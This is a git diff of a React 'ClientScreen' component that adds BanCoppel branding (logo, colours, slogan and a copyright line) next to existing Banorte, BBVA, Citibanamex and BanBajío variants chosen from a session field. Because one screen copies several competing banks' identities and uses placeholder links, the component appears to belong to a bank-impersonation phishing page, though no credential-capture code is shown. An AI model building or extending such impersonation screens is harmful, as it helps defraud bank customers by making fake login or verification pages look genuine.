@@ -11,6 +11,7 @@ import banbajioBackground from '../assets/IMG_0354.jpeg';
 import bbvaLogo from '@assets/bbva_logo.png';
 import bbvaLogoWhite from '../assets/bbva_logo_white.png';
 import banorteLogoHeader from '@assets/Bo.png.png';
+import bancoppelLogo from '@assets/bancoppel.png';
 import banorteLogoFooter from '@assets/Banorte-01.png';
 
 export default function ClientScreen() {
@@ -152,6 +153,17 @@ export default function ClientScreen() {
           />
         </header>
       );
+    } else if (sessionData.banco === 'BANCOPPEL') {
+      return (
+        <header className="bg-[#0066B3] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+          <img 
+            src={bancoppelLogo} 
+            className="h-20 inline-block" 
+            alt="BanCoppel" 
+          />
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -193,21 +205,25 @@ export default function ClientScreen() {
             <a href="#" className={`${
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
+              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href="#" className={`${
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
+              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               'text-[#EC1C24]'
             } mx-2`}>Ayuda</a>
             <a href="#" className={`${
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
+              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               'text-[#EC1C24]'
             } mx-2`}>Términos y condiciones</a>
             <a href="#" className={`${
               sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
+              sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               'text-[#EC1C24]'
             } mx-2`}>Seguridad en línea</a>
           </div>
@@ -215,6 +231,7 @@ export default function ClientScreen() {
           <div className={`${
             sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 
             sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
+            sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -227,6 +244,7 @@ export default function ClientScreen() {
             <div>© {
               sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 
               sessionData.banco === 'BBVA' ? 'BBVA' :
+              sessionData.banco === 'BANCOPPEL' ? 'BanCoppel' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
@@ -255,6 +273,12 @@ export default function ClientScreen() {
       return (
         <div className="text-center mt-2 px-4">
           <p className="text-sm text-gray-600 mt-1">Tu banca en línea, más segura y con mayor protección</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'BANCOPPEL') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">La llave a tu mundo financiero</p>
         </div>
       );
     } else {
